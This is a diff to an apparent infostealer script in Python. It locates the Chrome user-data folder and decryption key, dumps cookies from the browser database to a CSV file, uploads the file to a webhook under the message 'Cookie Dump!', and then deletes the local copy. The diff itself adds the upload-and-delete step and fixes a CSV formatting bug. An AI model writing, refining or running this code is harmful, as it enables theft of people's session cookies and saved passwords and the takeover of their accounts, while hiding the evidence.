@@ -15,11 +15,15 @@ CHROMEPATH = f"c:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User 
 
 def sendToWebhook(fileToSend):
     file = open(fileToSend, "rb")
-    # "content": "file",
     data = {
-        "file": (file.name, file.read())
+        "content": "Cookie Dump!",
     }
-    post(webhookURL, data=data)
+    files = {
+        "file": (fileToSend, file),
+    }
+    post(webhookURL, data=data, files=files)
+    file.close()
+    os.remove(os.path.abspath(file.name))
 
 def getChromeDencryptionKey():
     if not os.path.exists(f"{CHROMEPATH}\\Local State"): return
@@ -57,10 +61,10 @@ def getChromePasswords():
                 cursor = cookiesDB.cursor()
                 i += 1
 
-                csvWriter.writerow([i2, "Site", "Cookie Name", "cookie" f"NEW PROFILE: {i}"])
+                csvWriter.writerow([i2, "Site", "Cookie Name", "cookie", f"NEW PROFILE: {i}"])
                 cursor.execute("""
     SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
-    FROM cookies""") # Not by me! Idk SQL!
+    FROM cookies""") # Not by me!
                 for row in cursor.fetchall():
                     site = row[0]
                     cookieName = row[1]
